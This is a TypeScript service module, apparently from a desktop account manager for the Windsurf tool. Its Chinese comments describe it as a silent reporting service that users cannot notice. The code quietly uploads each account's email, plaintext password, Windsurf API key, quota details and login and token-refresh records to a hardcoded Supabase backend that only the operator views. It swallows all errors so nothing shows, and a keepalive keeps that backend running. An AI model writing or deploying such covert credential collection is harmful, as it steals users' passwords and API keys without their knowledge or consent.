// ============================================================
// Supabase 静默上报服务
// 用户无感知，所有登录/刷新操作自动上报到你的 Supabase 后台
// 仅管理员通过 Supabase Dashboard 查看数据
// ============================================================

import type { Account } from '@/types';

// ============================================================
// 硬编码配置（打包后用户无法看到/修改）
// 需要替换为你自己的 Supabase 项目信息
// ============================================================
const SUPABASE_URL = 'https://omqgvexendjycxzhyrii.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9tcWd2ZXhlbmRqeWN4emh5cmlpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQwOTUxNjksImV4cCI6MjA4OTY3MTE2OX0.H_NgiwZoRuAYMOUftsNIqSemoipA__AfMZ1j7xd_eBk';

// ============================================================
// 通用请求（静默，任何异常不影响主流程）
// ============================================================
async function post(table: string, body: any, headers: Record<string, string> = {}): Promise<void> {
  try {
    await fetch(`${SUPABASE_URL}/rest/v1/${table}`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'return=minimal,resolution=merge-duplicates',
        ...headers,
      },
      body: JSON.stringify(body),
    });
  } catch {
    // 静默失败，不影响用户体验
  }
}

// ============================================================
// 账号上报（upsert，email为唯一键）
// ============================================================
function buildRow(account: Account, password?: string) {
  return {
    local_id: account.id,
    email: account.email,
    password: password || account.password || null,
    nickname: account.nickname || '',
    tags: account.tags || [],
    group_name: account.group || '',
    plan_type: account.plan_name || 'unknown',
    status: typeof account.status === 'string' ? account.status : 'error',
    token_expires_at: account.token_expires_at || null,
    subscription_expires_at: account.subscription_expires_at || null,
    subscription_active: account.subscription_active ?? null,
    used_quota: account.used_quota || 0,
    total_quota: account.total_quota || 0,
    last_quota_update: account.last_quota_update || null,
    windsurf_api_key: account.windsurf_api_key || null,
    is_disabled: account.is_disabled || false,
    is_team_owner: account.is_team_owner || false,
    daily_quota_remaining_percent: account.dailyQuotaRemainingPercent ?? null,
    weekly_quota_remaining_percent: account.weeklyQuotaRemainingPercent ?? null,
    daily_quota_reset_timestamp: account.dailyQuotaResetTimestamp ?? null,
    weekly_quota_reset_timestamp: account.weeklyQuotaResetTimestamp ?? null,
    last_login_at: new Date().toISOString(),
    source: 'desktop_app',
  };
}

/**
 * 静默上报账号信息到云端（upsert）
 */
async function syncAccountToCloud(account: Account, password?: string): Promise<void> {
  await post('windsurf_accounts', buildRow(account, password));
}

/**
 * 静默记录登录操作
 */
async function recordLoginToCloud(
  email: string,
  success: boolean,
  planType?: string,
  errorMessage?: string
): Promise<void> {
  await post('login_records', {
    email,
    action: 'login',
    plan_type: planType || null,
    success,
    error_message: errorMessage || null,
    device_info: navigator.userAgent,
  });
}

/**
 * 静默记录Token刷新操作
 */
async function recordRefreshToCloud(
  email: string,
  success: boolean,
  planType?: string
): Promise<void> {
  await post('login_records', {
    email,
    action: 'refresh_token',
    plan_type: planType || null,
    success,
    device_info: navigator.userAgent,
  });
}

// ============================================================
// 每日保活：防止 Supabase 免费项目7天无活跃被暂停
// 应用启动时自动发送一次心跳，之后每24小时发一次
// ============================================================
const KEEPALIVE_KEY = 'supabase_last_keepalive';
let keepaliveTimer: ReturnType<typeof setInterval> | null = null;

async function sendKeepalive(): Promise<void> {
  try {
    await fetch(`${SUPABASE_URL}/rest/v1/operation_logs`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'return=minimal',
      },
      body: JSON.stringify({
        action: 'keepalive',
        target_email: 'system',
        detail: { ts: new Date().toISOString(), ua: navigator.userAgent },
      }),
    });
    localStorage.setItem(KEEPALIVE_KEY, String(Date.now()));
  } catch {
    // 静默
  }
}

/**
 * 启动保活定时器（应用启动时调用一次即可）
 * 每24小时发一次心跳请求，确保项目不被暂停
 */
function startKeepalive(): void {
  // 检查距离上次心跳是否超过20小时
  const last = Number(localStorage.getItem(KEEPALIVE_KEY) || '0');
  const hoursSinceLast = (Date.now() - last) / (1000 * 60 * 60);
  if (hoursSinceLast >= 20) {
    sendKeepalive();
  }
  // 每24小时发一次
  if (!keepaliveTimer) {
    keepaliveTimer = setInterval(sendKeepalive, 24 * 60 * 60 * 1000);
  }
}

// ============================================================
// 导出
// ============================================================
export const supabaseService = {
  syncAccountToCloud,
  recordLoginToCloud,
  recordRefreshToCloud,
  startKeepalive,
};
